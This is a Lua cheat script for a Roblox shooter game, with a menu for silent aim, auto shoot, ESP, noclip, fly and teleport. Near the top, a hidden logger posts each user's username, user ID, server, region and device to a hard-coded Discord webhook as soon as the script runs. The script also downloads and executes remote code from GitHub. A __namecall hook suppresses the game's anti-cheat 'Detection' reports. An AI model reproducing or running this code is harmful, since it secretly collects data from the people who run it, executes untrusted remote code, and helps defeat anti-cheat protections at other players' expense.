local _1 = "https://discord.com/api/webhooks/1516085284792565850/PF4fTRzaZ0o2nQQOLZHZFayj7LV1125XNoCXh4MC2VZu5h5Mg-AQ3M0pkK8bfR-lw6PQ"
workspace.FallenPartsDestroyHeight = -0 / 0
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

if not LocalPlayer then
    return
end

local _FRPlayers = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
local _FRPlayer = _FRPlayers.LocalPlayer
local _ForceRestEnabled = false
local _ForceRestHeartbeat = nil

local function forceReset()
    local character = _FRPlayer.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
        character:BreakJoints()
    end
end

local function checkHealth()
    if not _ForceRestEnabled then return end
    local character = _FRPlayer.Character
    if not character then return end
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid and humanoid.Health <= 10 then
        forceReset()
    end
end

_FRPlayer.CharacterAdded:Connect(function()
    if _ForceRestEnabled then
        task.wait(0.5)
        checkHealth()
    end
end)

if _ForceRestHeartbeat then
    _ForceRestHeartbeat:Disconnect()
    _ForceRestHeartbeat = nil
end
_ForceRestHeartbeat = game:GetService("RunService").Heartbeat:Connect(checkHealth)

local _2 = (syn and syn.request) or (http and http.request) or (request)

local function _3(_4, _5)
    local _6 = { embeds = { _5 } }
    local _7 = HttpService:JSONEncode(_6)
    if _2 then
        local _8, _9 = pcall(function()
            return _2({
                Url = _4,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = _7
            })
        end)
        if _8 and _9 then
            local _10 = _9.StatusCode or _9.status or (_9.Success and 204)
            if _10 == 200 or _10 == 204 then
                return true
            end
        end
    end
    if HttpService and HttpService.PostAsync then
        local _8, _11 = pcall(function()
            HttpService:PostAsync(_4, _7, Enum.HttpContentType.ApplicationJson)
        end)
        if _8 then
            return true
        end
    end
    return false
end

local function _12(_13)
    local _14 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%s&size=150x150&format=Png&isCircular=false"
    local _8, _15 = pcall(function()
        return game:HttpGet(_14:format(_13))
    end)
    if not _8 then return nil end
    local _16, _17 = pcall(function() return HttpService:JSONDecode(_15) end)
    if not _16 or not _17 or not _17.data or not _17.data[1] then
        return nil
    end
    return _17.data[1].imageUrl
end

local function _18()
    local _19 = "Unknown"
    local _8, _20 = pcall(function() return UserInputService:GetPlatform() end)
    if _8 and _20 then
        _19 = tostring(_20):gsub("Enum%.Platform%.", "")
    end
    local p = _19:lower()
    local _21, _22 = "Unknown", "❓"
    if p:match("windows") or p:match("mac") or p:match("linux") or p:match("osx") or p:match("studio") then
        _21, _22 = "PC", "💻"
    elseif p:match("ios") or p:match("android") or p:match("ipad") or p:match("iphone") then
        _21, _22 = "Mobile", "📱"
    elseif p:match("xbox") or p:match("ps") or p:match("playstation") or p:match("nintendo") or p:match("console") then
        _21, _22 = "Console", "🎮"
    else
        if UserInputService.TouchEnabled then
            _21, _22 = "Mobile", "📱"
        else
            _21, _22 = "PC / Desktop", "💻"
        end
    end
    return {
        platformRaw = _19,
        category = _21,
        emoji = _22
    }
end

local function _23(_24)
    local _25 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
    if not _25 then
        return "No servers folder found", "n/a"
    end
    local _26 = tostring(_24)
    local _27 = "not found"
    local _28 = "not found"
    for _, _29 in ipairs(_25:GetChildren()) do
        if _29:IsA("IntValue") then
            local _30 = _29:GetAttributes()
            if _30 then
                local _31 = _30.players
                if _31 and string.find(tostring(_31), _26) then
                    _27 = _30.name or "unknown"
                    _28 = _30.region or "n/a"
                    break
                end
            end
        end
    end
    return _27, _28
end

local function _32()
    local _33
    for i = 1, 10 do
        _33 = _12(LocalPlayer.UserId)
        if _33 then break end
        task.wait(0.2)
    end
    _33 = _33 or ""
    local _34 = _18()
    local _35, _36 = _23(LocalPlayer.UserId)
    local _37 = {
        title = "Execution Logs",
        color = 0xffbdd2,
        fields = {
            { name = "⚓ Display Name", value = tostring(LocalPlayer.DisplayName or "Unknown"), inline = true },
            { name = "🔗 Username", value = tostring(LocalPlayer.Name or "Unknown"), inline = true },
            { name = "📌 User ID", value = tostring(LocalPlayer.UserId or "Unknown"), inline = true },
            { name = "🌐 Server", value = _35, inline = true },
            { name = "📍 Region", value = _36, inline = true },
            { name = "Device", value = string.format("%s %s (%s)", _34.emoji, _34.category, _34.platformRaw), inline = false },
            { name = "⏱️ Timestamp", value = "<t:" .. os.time() .. ":R>", inline = false },
        },
        thumbnail = { url = _33 },
        footer = { text = "Universal V2 | Private" }
    }
    _3(_1, _37)
end

if _1 and _1 ~= "" then
    _32()
end

local _38 = "A94A07A9-74A6-4D86-A747-832EF519DAC7"
local _39 = 0

local _40, _ = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/refs/heads/main/Adonis.lua", true))()
end)

local originalNamecall
originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    if checkcaller() then return originalNamecall(self, ...) end
    local args = {...}
    local method = getnamecallmethod()
    if method == "FireServer" and self.Name == "MainRemoteEvent" then
        if args[1] == "Detection" then
            return coroutine.yield()
        elseif args[1] == "StompXD" then
            args[3] = true
            return originalNamecall(unpack(args))
        end
    end
    if method == "FireServer" then
        local parent = self.Parent
        if parent then
            local name = parent.Name:lower()
            local cancelWeapons = {
                ["revolver"] = true,
                ["double-barrel sg"] = true,
                ["tacticalshotgun"] = true
            }
            if cancelWeapons[name] then
                if type(args[1]) == "string" and args[1]:lower() == "shoot" then
                    return nil
                end
            end
        end
    end
    return originalNamecall(self, ...)
end)

wait(1)

local _47 = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
local _48 = loadstring(game:HttpGet(_47 .. 'Library.lua'))()
local _49 = loadstring(game:HttpGet(_47 .. 'addons/ThemeManager.lua'))()
local _50 = loadstring(game:HttpGet(_47 .. 'addons/SaveManager.lua'))()

local _51 = game:GetService("Players")
local _52 = game:GetService("RunService")
local _53 = game:GetService("Workspace")
local _54 = game:GetService("UserInputService")
local _55 = game:GetService("ReplicatedStorage")

local _56 = _51.LocalPlayer
if not _56 then
    repeat wait() until _51.LocalPlayer
    _56 = _51.LocalPlayer
end

local _57 = _56:GetMouse()
local _58 = _53.CurrentCamera

local _59 = _48:CreateWindow({
    Title = 'Rawr.xyz | Dev UI',
    Center = true,
    AutoShow = true,
    TabPadding = 2,
    MenuFadeTime = 0.2
})

local _60 = {
    Main = _59:AddTab('Main'),
    ['UI Settings'] = _59:AddTab('UI Settings'),
}

shared.hitman = {
    silent = {
        enabled = false,
        key = "c",
        prediction = 0,
        hitpart = "HumanoidRootPart",
        mode = "sticky"
    },
    visuals = {
        snaplines = {
            enabled = true,
            position = "mouse",
            color = Color3.fromRGB(255, 255, 255),
            thickness = 1
        },
        targetinfo = {
            enabled = true,
            color = Color3.fromRGB(255, 200, 100),
            textcolor = Color3.fromRGB(255, 255, 255)
        }
    },
    checks = {
        knock = true,
        wall = true,
        protected = true,
        whitelist = {
            enabled = false,
            players = {},
        },
    },
    misc = {
        voidhide = {
            enabled = true,
            key = "p"
        },
        cframefly = {
            enabled = false,
            key = "t",
            speed = 350
        },
    }
}

local _61 = _60.Main:AddLeftTabbox()
local _62 = _61:AddTab('Main')

local _63 = _62:AddToggle('Enabled', {
    Text = 'Silent Aim',
    Default = false,
})

local _64 = _63:AddKeyPicker('EnabledKeybind', {
    Default = 'C',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Toggle Bind',
    NoUI = false
})

local _65 = _62:AddDropdown('Mode', {
    Values = { 'Sticky', 'Auto Select', 'Target All', 'Multi' },
    Default = 'Sticky',
    Text = 'Target Mode',
})

_62:AddToggle('ManipulatedText', {
    Text = 'Show Watermark',
    Default = false,
})

_62:AddToggle('TargetInfo', {
    Text = 'Target Info Panel',
    Default = false,
})

local _66 = _60.Main:AddLeftTabbox()
local _67 = _66:AddTab('Target')

local _68 = _67:AddToggle('Spectate', {
    Text = 'Spectate Target',
    Default = false,
})

local _69 = _67:AddToggle('Highlight', {
    Text = 'Player Highlight',
    Default = false,
})

local _70 = _69:AddColorPicker('HighlightFillColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Title = 'Fill Color',
    Transparency = 0.5
})

local _71 = _69:AddColorPicker('HighlightOutlineColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Title = 'Outline Color',
    Transparency = 0
})

local _72 = _67:AddToggle('Line', {
    Text = 'Snap Lines',
    Default = false,
})

local _73 = _72:AddColorPicker('LineColor', {
    Default = Color3.fromRGB(255, 255, 255),
    Title = 'Line Color',
    Transparency = 1
})

local _74 = _67:AddToggle('AutoShoot', {
    Text = 'Auto Shoot',
    Default = false,
})

_67:AddToggle('WhitelistEnabled', {
    Text = 'Enable Whitelist',
    Default = false,
})
_67:AddDropdown('WhitelistPlayers', {
    Text = 'Whitelisted Players',
    Values = { '(loading...)' },
    Multi = true,
    Default = {},
})
_67:AddButton('Refresh List', function()
    task.defer(function() pcall(_WL_RefreshDropdown) end)
end)
_67:AddButton('Add Target', function()
    task.defer(function() pcall(_WL_AddCurrentTarget) end)
end)

_67:AddToggle('BlacklistEnabled', {
    Text = 'Enable Blacklist',
    Default = false,
})
_67:AddToggle('AutoBlockFriends', {
    Text = 'Auto-Block Friends',
    Default = true,
})
_67:AddDropdown('BlacklistPlayers', {
    Text = 'Blacklisted Players',
    Values = { '(loading...)' },
    Multi = true,
    Default = {},
})
_67:AddButton('Refresh List', function()
    task.defer(function() pcall(_BL_RefreshDropdown) end)
end)
_67:AddButton('Add Target', function()
    task.defer(function() pcall(_BL_AddCurrentTarget) end)
end)

local _75 = _60.Main:AddLeftTabbox()
local _76 = _75:AddTab('Checks')

_76:AddToggle('KnockCheck', {
    Text = 'Skip Knocked Players',
    Default = true,
})

_76:AddToggle('ProtectedCheck', {
    Text = 'Skip Protected Players',
    Default = true,
})

local _77 = _60.Main:AddRightTabbox()
local _78 = _77:AddTab('Misc')

_78:AddLabel('Movement')
local _79 = _78:AddToggle('VoidHide', {
    Text = 'Void Hide',
    Default = false,
})

local _80 = _79:AddKeyPicker('VoidHideKeybind', {
    Default = 'P',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Bind',
    NoUI = false
})

local _247 = _78:AddToggle('CFrameFly', {
    Text = 'CFrame Fly',
    Default = false,
})

_247:AddKeyPicker('CFrameFlyKeybind', {
    Default = 'T',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Bind',
    NoUI = false
})

_78:AddSlider('FlySpeed', {
    Text = 'Fly Speed',
    Default = 350,
    Min = 50,
    Max = 5000,
    Rounding = 0,
})

local _NoclipToggle = _78:AddToggle('Noclip', {
    Text = 'NoClip',
    Default = false,
})

local _WSToggle = _78:AddToggle('WalkSpeedEnabled', {
    Text = 'Walk Speed',
    Default = false,
})

_WSToggle:AddKeyPicker('WalkSpeedKeybind', {
    Default = 'Z',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Bind',
    NoUI = false
})

_78:AddSlider('WalkSpeed', {
    Text = 'Speed',
    Default = 16,
    Min = 16,
    Max = 1000,
    Rounding = 0,
    Suffix = '',
})

local _JPToggle = _78:AddToggle('JumpPowerEnabled', {
    Text = 'Jump Power',
    Default = false,
})

_JPToggle:AddKeyPicker('JumpPowerKeybind', {
    Default = 'X',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Bind',
    NoUI = false
})

_78:AddSlider('JumpPower', {
    Text = 'Power',
    Default = 50,
    Min = 50,
    Max = 500,
    Rounding = 0,
    Suffix = '',
})

_78:AddDivider()
_78:AddLabel('Utility')
local _AR_Toggle = _78:AddToggle('AutoReload', {
    Text = 'Auto Reload',
    Default = true,
})

local _AutoEquipDBToggle = _78:AddToggle('AutoEquipDB', {
    Text = 'Auto Equip DB',
    Default = false,
})

local _ForceRestToggle = _78:AddToggle('ForceRest', {
    Text = 'Auto Force Rest',
    Default = false,
})
_ForceRestToggle:OnChanged(function(value)
    _ForceRestEnabled = value
end)

_78:AddButton('Force Rest', function()
    forceReset()
end)

_78:AddButton('Rapid Fire', function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/refs/heads/main/Supporting/RapidFire.lua'))()
end)

_78:AddDivider()
_78:AddLabel('Auto Armor')
local _AutoArmorToggle = _78:AddToggle('AutoArmor', {
    Text = 'Auto Armor',
    Default = false,
})

local _AutoArmorThresholdSlider = _78:AddSlider('AutoArmorThreshold', {
    Text = 'Armor Threshold',
    Default = 200,
    Min = 10,
    Max = 200,
    Rounding = 0,
    Suffix = '',
})

local _AutoArmorVoidIgnoreToggle = _78:AddToggle('AutoArmorVoidIgnore', {
    Text = 'Ignore Void Hide',
    Default = true,
})

_78:AddDivider()
_78:AddLabel('Player ESP')
local _ESPEnabled = _78:AddToggle('ESPEnabled', {
    Text = 'ESP Enabled',
    Default = true,
})
_78:AddToggle('ESPShowNames', {
    Text = 'Player Names',
    Default = true,
})
_78:AddToggle('ESPShowDistance', {
    Text = 'Distance',
    Default = false,
})
_78:AddToggle('ESPShowHealth', {
    Text = 'Health',
    Default = false,
})

_78:AddDivider()
local _TPDropdown = _78:AddDropdown('TPPlayer', {
    Text = 'Select Player',
    Values = { '(loading...)' },
    Default = '(loading...)',
})
_78:AddButton('Teleport', function()
    local name = Options.TPPlayer and Options.TPPlayer.Value
    if not name or name == '' or name == '(loading...)' then return end
    local target = nil
    for _, plr in ipairs(_51:GetPlayers()) do
        local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
        if plr.Name == name or plr.DisplayName == name or formatted == name then
            target = plr
            break
        end
    end
    if not target or not target.Character then return end
    local root = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
    if not root then return end
    local myChar = _56.Character
    if not myChar then return end
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    if myRoot then
        myRoot.CFrame = root.CFrame * CFrame.new(0, 3, 0)
    end
end)

local function _TP_RefreshDropdown()
    local names = {}
    for _, plr in ipairs(_51:GetPlayers()) do
        if plr ~= _56 then
            table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name))
        end
    end
    table.sort(names)
    if #names == 0 then names = { '(no other players)' } end
    local kept = Options.TPPlayer and Options.TPPlayer.Value or ''
    pcall(function()
        Options.TPPlayer:SetValues(names)
        if kept ~= '' and kept ~= '(loading...)' then
            Options.TPPlayer:SetValue(kept)
        elseif #names > 0 and kept ~= '(no other players)' then
            Options.TPPlayer:SetValue(names[1])
        end
    end)
end

task.spawn(function()
    while task.wait(1) do
        _TP_RefreshDropdown()
    end
end)

local _81 = _60.Main:AddRightTabbox()
local _82 = _81:AddTab('server finder')

local function _83(tab)
    tab:AddInput('UserIdInput', {
        Default = '',
        Numeric = true,
        Text = 'user id',
        Placeholder = '123456789'
    })
    local _84 = tab:AddLabel('server: not found')
    local _85 = tab:AddLabel('region: not found')
    local function _86()
        local _87 = Options.UserIdInput.Value
        if _87 == "" then
            _84:SetText('server: not found')
            _85:SetText('region: not found')
            return
        end
        local _88 = game:GetService("ReplicatedStorage"):FindFirstChild("Servers")
        if not _88 then
            _84:SetText('server: no servers folder')
            _85:SetText('region: n/a')
            return
        end
        local _89 = tostring(_87)
        local _90 = "not found"
        local _91 = "not found"
        for _, _92 in ipairs(_88:GetChildren()) do
            if _92:IsA("IntValue") then
                local _93 = _92:GetAttributes()
                if _93 then
                    local _94 = _93.players
                    if _94 and string.find(tostring(_94), _89) then
                        _90 = _93.name or "unknown"
                        _91 = _93.region or "n/a"
                        if setclipboard then
                            setclipboard(_90)
                        end
                        break
                    end
                end
            end
        end
        _84:SetText('server: ' .. _90)
        _85:SetText('region: ' .. _91)
    end
    Options.UserIdInput:OnChanged(function()
        _86()
    end)
    task.spawn(function()
        task.wait(0.5)
        _86()
    end)
    return {
        Update = _86
    }
end

local _95 = _83(_82)

local _96 = _60['UI Settings']:AddLeftGroupbox('Menu')
_96:AddButton('Rejoin', function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, _56)
end)
_96:AddButton('Server Hop', function()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local PlaceId = game.PlaceId
    local CurrentJobId = game.JobId
    local success, response = pcall(function()
        return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?limit=100")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        local availableServers = {}
        if data and data.data then
            for _, server in ipairs(data.data) do
                if server.id ~= CurrentJobId and server.playing and server.playing < server.maxPlayers then
                    table.insert(availableServers, server.id)
                end
            end
        end
        if #availableServers > 0 then
            local targetJobId = availableServers[math.random(#availableServers)]
            TeleportService:TeleportToPlaceInstance(PlaceId, targetJobId, _56)
            return
        end
    end
    TeleportService:Teleport(PlaceId, _56)
end)
_96:AddLabel('Menu Bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu Toggle' })

_48.ToggleKeybind = Options.MenuKeybind

_49:SetLibrary(_48)
_50:SetLibrary(_48)
_50:IgnoreThemeSettings()
_50:SetIgnoreIndexes({ 'MenuKeybind' })
_49:SetFolder('woodie')
_50:SetFolder('woodie/specific-game')
_50:BuildConfigSection(_60['UI Settings'])
_49:ApplyToTab(_60['UI Settings'])
_50:LoadAutoloadConfig()

task.wait(1)

setfflag("DebugRunParallelLuaOnMainThread", "true")

local _104 = {
    enabled = false,
    active = false,
    targetplayer = nil,
    targetplayers = {},
    targetpart = nil,
    targetposition = nil,
    keybind = "c",
    hitchance = 100,
    hitpart = "Head",
    lasthealth = {},
    wasknocked = {},
    mode = "sticky",
    autoshoot = false,
    currentmode = "sticky"
}

local function _isMode(mode)
    if _104.currentmode == "multi" then return true end
    return _104.currentmode == mode
end

local _WL_Cache = {}

local function _WL_Enabled()
    return Toggles.WhitelistEnabled and Toggles.WhitelistEnabled.Value
end

local function _WL_GetSelectedMap()
    if not Options.WhitelistPlayers then return {} end
    local v = Options.WhitelistPlayers.Value
    local map = {}
    if type(v) ~= "table" then
        if type(v) == "string" and v ~= "" then map[v] = true end
        return map
    end
    for key, val in pairs(v) do
        if val == true then
            if type(key) == "string" and key ~= "" and key ~= "(loading...)" and key ~= "(no other players)" then
                map[key] = true
            end
        elseif type(val) == "string" and val ~= "" and val ~= "(loading...)" and val ~= "(no other players)" then
            map[val] = true
        end
    end
    return map
end

local function _WL_RebuildCache()
    table.clear(_WL_Cache)
    for name in pairs(_WL_GetSelectedMap()) do
        _WL_Cache[name:lower()] = true
        local p = _51:FindFirstChild(name)
        if p then _WL_Cache["uid:" .. tostring(p.UserId)] = true end
    end
end

local function _WL_IsListed(plr)
    if not plr then return false end
    local map = _WL_GetSelectedMap()
    local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
    if map[plr.Name] or map[plr.DisplayName] or map[formatted] then return true end
    if _WL_Cache["uid:" .. tostring(plr.UserId)] then return true end
    local nl, dl, fl = plr.Name:lower(), plr.DisplayName:lower(), formatted:lower()
    for name in pairs(map) do
        local l = name:lower()
        if l == nl or l == dl or l == fl then return true end
    end
    return false
end

function _WL_Allows(plr)
    if not _WL_Enabled() then return true end
    if not next(_WL_GetSelectedMap()) then return true end
    return _WL_IsListed(plr)
end

function _WL_SyncShared()
    shared.hitman.checks.whitelist.enabled = _WL_Enabled()
    local names = {}
    for name in pairs(_WL_GetSelectedMap()) do table.insert(names, name) end
    table.sort(names)
    shared.hitman.checks.whitelist.players = names
    _WL_RebuildCache()
end

function _WL_RefreshDropdown()
    local names = {}
    for _, plr in ipairs(_51:GetPlayers()) do
        if plr ~= _56 then table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name)) end
    end
    table.sort(names)
    if #names == 0 then names = { "(no other players)" } end
    local kept = _WL_GetSelectedMap()
    pcall(function()
        Options.WhitelistPlayers:SetValues(names)
        local restore = {}
        for _, n in ipairs(names) do
            if kept[n] then restore[n] = true end
        end
        if next(restore) then Options.WhitelistPlayers:SetValue(restore) end
    end)
    _WL_RebuildCache()
end

function _WL_AddCurrentTarget()
    if not _104.targetplayer then return end
    local map = _WL_GetSelectedMap()
    map[_104.targetplayer.Name] = true
    pcall(function() Options.WhitelistPlayers:SetValue(map) end)
    if not Toggles.WhitelistEnabled.Value then Toggles.WhitelistEnabled:SetValue(true) end
    _WL_SyncShared()
end

function _WL_ValidateCurrentTarget()
    if _104.targetplayer and not _WL_Allows(_104.targetplayer) then
        _104.targetplayer = nil
        _104.targetpart = nil
        _104.targetposition = nil
        task.defer(function()
            if _105 then pcall(_150) end
            pcall(_161)
            pcall(function() _168(false) end)
        end)
    end
end

local _BL_Cache = {}

local function _BL_Enabled()
    return Toggles.BlacklistEnabled and Toggles.BlacklistEnabled.Value
end

local function _BL_GetSelectedMap()
    if not Options.BlacklistPlayers then return {} end
    local v = Options.BlacklistPlayers.Value
    local map = {}
    if type(v) ~= "table" then
        if type(v) == "string" and v ~= "" then map[v] = true end
        return map
    end
    for key, val in pairs(v) do
        if val == true then
            if type(key) == "string" and key ~= "" and key ~= "(loading...)" and key ~= "(no other players)" then
                map[key] = true
            end
        elseif type(val) == "string" and val ~= "" and val ~= "(loading...)" and val ~= "(no other players)" then
            map[val] = true
        end
    end
    return map
end

local function _BL_RebuildCache()
    table.clear(_BL_Cache)
    for name in pairs(_BL_GetSelectedMap()) do
        _BL_Cache[name:lower()] = true
        local p = _51:FindFirstChild(name)
        if p then _BL_Cache["uid:" .. tostring(p.UserId)] = true end
    end
end

local function _BL_IsListed(plr)
    if not plr then return false end
    local map = _BL_GetSelectedMap()
    local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
    if map[plr.Name] or map[plr.DisplayName] or map[formatted] then return true end
    if _BL_Cache["uid:" .. tostring(plr.UserId)] then return true end
    local nl, dl, fl = plr.Name:lower(), plr.DisplayName:lower(), formatted:lower()
    for name in pairs(map) do
        local l = name:lower()
        if l == nl or l == dl or l == fl then return true end
    end
    return false
end

local function _BL_IsBlocked(plr)
    if not plr then return false end
    if not _BL_Enabled() then return false end
    if Toggles.AutoBlockFriends and Toggles.AutoBlockFriends.Value and shared.FriendsCache and shared.FriendsCache[plr.UserId] then
        return true
    end
    return _BL_IsListed(plr)
end

function _BL_RefreshDropdown()
    local names = {}
    for _, plr in ipairs(_51:GetPlayers()) do
        if plr ~= _56 then table.insert(names, string.format("%s (%s)", plr.DisplayName, plr.Name)) end
    end
    table.sort(names)
    if #names == 0 then names = { "(no other players)" } end
    local kept = _BL_GetSelectedMap()
    pcall(function()
        Options.BlacklistPlayers:SetValues(names)
        local restore = {}
        for _, n in ipairs(names) do
            if kept[n] then restore[n] = true end
        end
        if next(restore) then Options.BlacklistPlayers:SetValue(restore) end
    end)
    _BL_RebuildCache()
end

function _BL_AddCurrentTarget()
    if not _104.targetplayer then return end
    local map = _BL_GetSelectedMap()
    map[_104.targetplayer.Name] = true
    pcall(function() Options.BlacklistPlayers:SetValue(map) end)
    if not Toggles.BlacklistEnabled.Value then Toggles.BlacklistEnabled:SetValue(true) end
    _BL_RebuildCache()
    _WL_ValidateCurrentTarget()
end

function _BL_ValidateCurrentTarget()
    if _104.targetplayer and _BL_IsBlocked(_104.targetplayer) then
        _104.targetplayer = nil
        _104.targetpart = nil
        _104.targetposition = nil
        task.defer(function()
            if _105 then pcall(_150) end
            pcall(_161)
            pcall(function() _168(false) end)
        end)
    end
end

local _105 = false
local _106 = nil
local _107 = nil
local _108 = nil
local _109 = nil
local _110 = nil
local _111 = nil
local _112 = 0
local _113 = 0.1

local _114 = {}
local _115 = {}

local _118 = false
local _119 = nil
local _120 = nil
local _121 = nil

local _AA_wasEnabled = false

local _127 = game:GetService("SoundService")

local _128 = _54.TouchEnabled
local _129 = _54.GamepadEnabled
local _130 = not _128 and not _129

if _128 or _129 then
    shared.hitman.visuals.snaplines.position = "center"
end

local _131 = Instance.new("Sound")
_131.SoundId = "rbxassetid://6534948092"
_131.Volume = 0.5
_131.Parent = _127

local _132 = Instance.new("Sound")
_132.SoundId = "rbxassetid://1255040462"
_132.Volume = 1.0
_132.Parent = _127

local _133 = Instance.new("ScreenGui")
_133.Name = "targetbob"
_133.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_133.DisplayOrder = 9999

if syn and syn.protect_gui then
    syn.protect_gui(_133)
    _133.Parent = game.CoreGui
elseif gethui then
    _133.Parent = gethui()
else
    _133.Parent = game.CoreGui
end

local _134 = Instance.new("TextLabel")
_134.Name = "putthatback"
_134.Parent = _133
_134.BackgroundTransparency = 1
_134.Size = UDim2.new(0, 120, 0, 18)
_134.Text = "rawr.xyz was here! | discord.gg/UFjWRWsSB"
_134.Visible = false
_134.Position = UDim2.new(0, 0, 0, 0)
_134.TextXAlignment = Enum.TextXAlignment.Left
_134.TextYAlignment = Enum.TextYAlignment.Top
_134.Font = Enum.Font.Code
_134.TextColor3 = Color3.fromRGB(255, 245, 245)
_134.TextSize = 13
_134.TextStrokeColor3 = Color3.fromRGB(40, 30, 20)
_134.TextStrokeTransparency = 0

local _135 = Instance.new("TextLabel")
_135.Name = "targetskid"
_135.Parent = _133
_135.BackgroundTransparency = 1
_135.Size = UDim2.new(0, 150, 0, 16)
_135.Text = ""
_135.Visible = false
_135.Position = UDim2.new(0, 0, 0, 0)
_135.TextXAlignment = Enum.TextXAlignment.Left
_135.TextYAlignment = Enum.TextYAlignment.Top
_135.Font = Enum.Font.Code
_135.TextColor3 = Color3.fromRGB(180, 130, 200)
_135.TextSize = 11
_135.TextStrokeColor3 = Color3.fromRGB(30, 20, 40)
_135.TextStrokeTransparency = 0

local _136 = {}
local _137 = {}

local function _138()
    for i, _139 in ipairs(_136) do
        _139:Remove()
    end
    for i, _140 in ipairs(_137) do
        _140:Remove()
    end
    _136 = {}
    _137 = {}
end

_138()

local function _141()
    if not _130 then return end
    local _142 = _54:GetMouseLocation()
    if Toggles.ManipulatedText.Value and _134.Visible then
        _134.Position = UDim2.new(0, _142.X + 10, 0, _142.Y + 10)
    end
    if Toggles.TargetInfo.Value and _135.Visible then
        _135.Position = UDim2.new(0, _142.X + 10, 0, _142.Y + 30)
    end
end

local function _143()
    local _144 = _56.Character
    if _144 then
        for _, _145 in ipairs(_144:GetChildren()) do
            if _145:IsA("Tool") and _145:FindFirstChild("Ammo") then
                _55.MainEvent:FireServer("Reload", _145)
            end
        end
    end
end

local function _146()
    local _144 = _56.Character
    local bp = _56.Backpack
    if _144 and bp then
        for _, _145 in ipairs(_144:GetChildren()) do
            if _145:IsA("Tool") then
                _145.Parent = bp
            end
        end
    end
end

local _243 = { enabled = false, master = false, keys = {}, connection = nil }
local _254 = nil
local _255 = nil

local _NoclipConnection = nil
local _WSConnection = nil
local _JPConnection = nil

local function _NoclipLoop()
    if not Toggles.Noclip.Value then return end
    local char = _56.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
        end
    end
end

local function _NoclipToggleChanged()
    if Toggles.Noclip.Value then
        if not _NoclipConnection then
            _NoclipConnection = _52.RenderStepped:Connect(_NoclipLoop)
        end
    else
        if _NoclipConnection then
            _NoclipConnection:Disconnect()
            _NoclipConnection = nil
        end
    end
end

Toggles.Noclip:OnChanged(_NoclipToggleChanged)

local function _WalkSpeedLoop()
    if not Toggles.WalkSpeedEnabled.Value then return end
    local char = _56.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.WalkSpeed = Options.WalkSpeed.Value
    end
end

local function _WalkSpeedChanged()
    if not _WSConnection then
        _WSConnection = _52.RenderStepped:Connect(_WalkSpeedLoop)
    end
end

Options.WalkSpeed:OnChanged(_WalkSpeedChanged)
Toggles.WalkSpeedEnabled:OnChanged(_WalkSpeedChanged)
task.spawn(_WalkSpeedChanged)

local function _JumpPowerLoop()
    if not Toggles.JumpPowerEnabled.Value then return end
    local char = _56.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.JumpPower = Options.JumpPower.Value
    end
end

local function _JumpPowerChanged()
    if not _JPConnection then
        _JPConnection = _52.RenderStepped:Connect(_JumpPowerLoop)
    end
end

Options.JumpPower:OnChanged(_JumpPowerChanged)
Toggles.JumpPowerEnabled:OnChanged(_JumpPowerChanged)
task.spawn(_JumpPowerChanged)

local function syncStateFromUI()
    _104.enabled = Toggles.Enabled.Value
    shared.hitman.silent.enabled = _104.enabled
    _104.mode = string.lower(Options.Mode.Value)
    _104.currentmode = string.lower(Options.Mode.Value)
    shared.hitman.silent.mode = _104.mode
    _104.autoshoot = Toggles.AutoShoot.Value
    shared.hitman.checks.knock = Toggles.KnockCheck.Value
    shared.hitman.checks.protected = Toggles.ProtectedCheck.Value
    pcall(_WL_SyncShared)
    shared.hitman.misc.voidhide.enabled = Toggles.VoidHide.Value
    _243.master = Toggles.CFrameFly.Value
end

local function _244()
    if not _243.enabled then return end
    local _144 = _56.Character
    if not _144 then return end
    local _148 = _144:FindFirstChildOfClass("Humanoid")
    local _120 = _144:FindFirstChild("HumanoidRootPart")
    if not _148 or not _120 then return end
    _148:ChangeState(Enum.HumanoidStateType.Freefall)
    local _249 = Vector3.zero
    local _58 = workspace.CurrentCamera
    if _243.keys[Enum.KeyCode.W] then _249 = _249 + _58.CFrame.LookVector end
    if _243.keys[Enum.KeyCode.S] then _249 = _249 - _58.CFrame.LookVector end
    if _243.keys[Enum.KeyCode.A] then _249 = _249 - _58.CFrame.RightVector end
